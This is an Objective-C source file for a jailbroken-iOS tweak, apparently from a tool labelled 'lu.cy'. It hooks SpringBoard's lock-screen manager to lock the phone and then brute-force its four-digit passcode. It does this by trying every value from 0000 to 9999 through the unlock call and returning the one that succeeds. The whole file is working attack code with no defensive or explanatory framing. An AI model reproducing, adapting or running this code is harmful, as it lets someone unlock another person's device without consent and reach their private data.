@interface LuCyPasscode : NSObject
+(id)sharedInstance;
-(BOOL)unlock:(NSString *)passcode;
-(NSString *)brute;
@end

@interface SBLockScreenManager : NSObject
+(id)sharedInstance;
-(BOOL)attemptUnlockWithPasscode:(id)arg1;
- (void)remoteLock:(_Bool)arg1;
@end

@implementation LuCyPasscode

+(id)sharedInstance {
	static id sharedInstance = nil;
	static dispatch_once_t token = 0;
	dispatch_once(&token, ^{
		sharedInstance = [self new];
	});
	return sharedInstance;
}

-(BOOL)unlock:(NSString *)passcode {
	return [[%c(SBLockScreenManager) sharedInstance] attemptUnlockWithPasscode:passcode];
}

-(void)lock {
	[[%c(SBLockScreenManager) sharedInstance] remoteLock:0];
}

-(NSString *)brute {
	[self lock];
	//if ([[UIApplication sharedApplication] isProtectedDataAvailable] == 1){
		
		NSLog(@"[lu.cy] Brute forcing passcode...");
		for(int i = 0; i <= 9999; i++) {
			NSString* numb = [@"000" stringByAppendingString:[NSString stringWithFormat:@"%d", i]];
			NSString* guess = [numb substringFromIndex:[numb length] - 4];
			BOOL status = [self unlock:guess];
			NSLog(@"[lu.cy] Guess: %@", guess);
			if(status){
				return guess;
			}
			[NSThread sleepForTimeInterval:1];
		}
		return @"Unable to brute force passcode";
	//}
	//return @"Device is currently unlocked";
}

@end